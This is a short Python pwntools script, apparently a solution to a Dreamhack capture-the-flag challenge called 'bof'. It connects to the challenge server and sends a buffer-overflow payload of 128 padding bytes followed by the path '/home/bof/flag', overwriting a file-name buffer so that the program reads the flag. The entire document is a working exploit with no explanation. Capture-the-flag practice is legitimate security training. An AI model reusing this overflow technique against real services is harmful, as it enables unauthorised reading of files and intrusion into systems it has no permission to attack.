from pwn import *

p = remote('host3.dreamhack.games', 21715)

e = ELF('./bof')

payload = b'A' * 128
payload += b'/home/bof/flag'

p.sendlineafter(b'meow? ', payload)

p.interactive()
